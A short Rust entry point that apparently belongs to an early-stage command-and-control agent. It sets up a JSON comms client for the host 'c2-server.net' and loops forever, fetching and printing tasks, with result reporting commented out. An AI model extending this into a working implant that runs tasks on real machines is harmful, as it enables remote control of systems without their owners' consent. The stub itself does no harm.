mod json_comms;

fn main() {
    println!("Hello, world!");
    let comms = json_comms::JsonComms {
        server : "c2-server.net".to_string(),
    };

    loop {
        let tasks = comms.get_tasks();
        for task in tasks {
            println!("{}", task);
        }
        // for elem in results {
            
        // }
    }
}
